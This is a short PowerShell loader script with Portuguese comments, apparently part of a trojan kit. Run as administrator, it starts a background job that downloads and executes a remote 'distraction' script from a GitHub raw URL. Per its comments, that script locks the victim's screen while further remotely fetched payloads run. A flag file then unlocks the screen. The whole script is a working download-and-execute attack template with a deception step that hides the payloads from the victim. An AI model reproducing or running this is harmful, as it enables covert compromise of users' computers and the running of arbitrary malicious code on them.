# ==============================================
# SCRIPT MESTRE - EXECUTADO NO POWERSHELL ADMIN
# ==============================================

# 1. Inicia a distração em background (ela vai travar a tela e esperar a flag)
$distractJob = Start-Job -ScriptBlock {
    iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1'))
}

# Dá um tempo para a distração abrir o formulário (2 segundos)
Start-Sleep -Seconds 2

# 2. AQUI VOCÊ ADICIONA SEUS PAYLOADS (UM POR UM)
# Exemplo:
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload1.ps1'))
# iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/seu/payload2.ps1'))

Write-Host "Aguardando 10 segundos"
Start-Sleep -Seconds 10

# 3. Após todos os payloads, cria a flag para destravar a tela
New-Item -Path "$env:TEMP\ov.stop" -ItemType File -Force | Out-Null

# Aguarda o job da distração terminar (opcional)
Wait-Job $distractJob
Remove-Job $distractJob -Force